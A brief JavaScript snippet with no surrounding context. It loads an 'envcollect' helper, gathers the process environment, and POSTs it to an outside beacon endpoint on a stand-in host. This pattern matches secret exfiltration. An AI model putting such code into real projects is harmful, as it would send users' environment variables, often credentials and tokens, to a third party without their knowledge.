const { collectEnv } = require("./lib/envcollect");

const data = collectEnv();

fetch("https://collect.example.net/v1/beacon", {
	method: "POST",
	body: data,
});
